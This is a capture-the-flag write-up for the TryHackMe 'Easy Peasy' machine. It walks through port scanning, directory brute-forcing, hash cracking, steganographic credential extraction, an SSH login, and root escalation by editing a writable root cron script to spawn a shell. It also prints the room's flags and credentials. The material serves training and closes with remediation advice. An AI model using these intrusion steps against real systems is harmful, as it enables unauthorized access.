# Lab Report - Easy Peasy


# Overview 
---
- **Category**: Web
- **Difficulty**: Easy
- **Platform**: Linux
- **Link**: https://tryhackme.com/room/easypeasyctf 
- **Tags**: #enumeration #privesc 

## Challenge Description 
---
> **- Basic boot-to-root machine.** 

## Resolution Summary 
---
>**We enumerated the machine, discovered hidden web directories and decoded multiple encodings/steganography to retrieve flags and credentials, cracked a webpage hash to reveal a password, and used extracted credentials to connect over SSH. After auditing scheduled tasks we found a root-run cron script with insecure permissions, modified it to spawn a root shell, achieving full compromise.**

# Information Gathering 
---
### Active Reconnaissance : 
---
- **We started by performing an Nmap scan on the target, we also scanned for services' versions to look early on for low hanging fruits.
```bash
nmap -sV 10.10.132.17 
```

- **Here are the results : 
```bash
#Results
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1
```

- **Just in case, we added the `-p-` flag to the Nmap scan, which proved to be useful: 
```bash
#Results 
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
```

## HTTP (80)
---
- **First we ran GoBuster to look for hidden directories, as there was not much on the web page at first sight (default Nginx welcome page). 
- **For the first one : 
```bash
gobuster dir -u 10.10.132.17 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 14
```

- **We uncovered the following directory : 
```bash
#Results
/hidden               (Status: 301)
```

- **There we found an image. We uploaded it and ran exiftool to find any hints in the picture's metadata.  
```bash
exiftool ./lost-places-http-80-hidden.jpg 
```
	- Unfortunatly, we did not find anything.

- **We attempted again GoBuster, but this time on the hidden directory : 
```bash
gobuster dir -u 10.10.132.17/hidden -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 14
```

- **When inspecting the Source page, we found a hidden string that seemed to be encoded in base64 :
```html
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
```

- **We decoded the hidden string using CyberChef and we got the first flag.
	- **`flag{f1rs7_fl4g}`**

## HTTP (65524)
---
- **For the second HTTP server, we were also greeted with the default Apache the welcome page.
- **However, upon inspecting the Source Page, we found a flag hiding in plain sight: 
	- **`flag{9fdafbd64c47471a8f54cd3fc64cd312}`**

- **Similarly to what has been done before, we also started here with GoBuster: 
```bash
gobuster dir -u http://10.10.132.17:65524 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 14 -x php,txt
```
- **And we found a `robots.txt` file that exposed a user agent, we used it and ran GoBuster again : 
```bash
gobuster dir -u http://10.10.132.17:65524 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 14 -a "a18672860d0510e5ab6699730763b250"
```
	- We did not find anything.

- **However, the user-agent ended up being an md5 hash that we cracked online to get a flag:
	- **`flag{1m_s3c0nd_fl4g}`**

- **Another available option was to curl the web page used that user-agent : 
```bash
curl -A "a18672860d0510e5ab6699730763b250" http://10.10.132.17:65524
```

- **As a result, we discovered a strange string : `ObsJmP173N2X6dOrAgEAL0Vu`, which we attempted to decode. 
- **It happened to be encoded in Base62, decoding it (with CyberChef) gave us a new directory : `/n0th1ng3ls3m4tt3r`, which is another flag:
	- **`/n0th1ng3ls3m4tt3r`**

- **We came across a web page, we investigated the Source Page as usual and found what seemed to be a hash : `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`, which we attempted to crack. We will use JTR : 
```bash
john --wordlist=/home/kali/Downloads/easypeasy_1596838725703.txt hash.txt
```
	- This gave us a good idea on what format the hash could be (we must specify it next).

```bash
john --wordlist=/home/kali/Downloads/easypeasy_1596838725703.txt hash.txt -format=gost
```

- **We got a password :
	- **`mypasswordforthatjob`**

- **We also extracted the binary code picture from the directory`/n0th1ng3ls3m4tt3r` and used `stegseek` to find data that was hidden inside the picture (using Steganography) :
```bash
stegseek binarycodepixabay.jpg /home/kali/Downloads/easypeasy_1596838725703.txt 
```

- **We found a username and a password in binary code, which we decoded to obtain the following credentials (to test on the SSH server) :
	- **`boring:iconvertedmypasswordtobinary`**

- **We connect over SSH using 
```bash
ssh boring@10.10.132.17 -p6498
```

- **We found the `user.txt` flag, which needed to be decoded using ROT13 on CyberChef.**
	- **`flag{n0wits33msn0rm4l}`**
# Privilege Escalation 
---
- **Upon inspecting usual privesc attack vectors, we found a vulnerable cronjob that was running as root. 
- **We found the binary attached to the cronjob: 
```bash
find / -name ".mysecretcronjob.sh" 2>/dev/null
```

- **We edited the previous binary to spawn a shell as root once the cronjob is executed: 
```bash
/bin/bash -i
```

- **And we make our way through root and read the root.txt flag.**
# Trophy 
---
**User.txt → `flag{n0wits33msn0rm4l}`  

**Root.txt → `flag{63a9f0ea7bb98050796b649e85481845}`**
# Remediation Summary
---
- **World-writable binaries in root owned cronjobs**: Ensure cron jobs and their scripts/binaries are owned by root and not writable by others (strict permissions).
- **Credentials hiding in images**:Remove credentials and sensitive data from web content and images; store secrets securely.

# Lessons Learned
---
- **Recursively using GoBuster on discovered hidden directories can be useful. 
- **Identify the hash algorithm/format** before cracking to save time.
- **Test different user-agents/headers**: servers may reveal different content based on them.
